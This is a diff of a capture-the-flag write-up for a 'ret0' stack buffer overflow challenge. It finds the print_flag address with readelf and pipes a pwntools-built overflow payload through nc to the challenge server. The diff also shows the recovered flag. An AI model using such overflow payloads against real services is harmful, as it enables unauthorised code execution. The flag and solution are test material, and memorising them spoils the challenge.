@@ -8,9 +8,7 @@ Looking at the .c file we can see that it might be vulnerable to a buffer overfl
 readelf -s ret0
 ```
 
-
 > 68: 00000000004011b3    89 FUNC    GLOBAL DEFAULT   13 print_flag
-
 
 We need to get to that address, we can use pwntools to get the address in the correct format.
 
@@ -56,12 +54,13 @@ We got the dummy flag!
 > What is your favorite food?
 Cool.
 wsc{Th0s3_p3sky_STACKS!!!}
-
-## Flag
+## Payload 
 
 ```
 python2 -c "from pwn import *; print 'A' * 24 + '\xb3\x11@\x00\x00\x00\x00'" | nc 107.191.51.129 5000
 ```
+
+## Flag
 
 > wsc{Th0s3_p3sky_STACKS!!!}
 
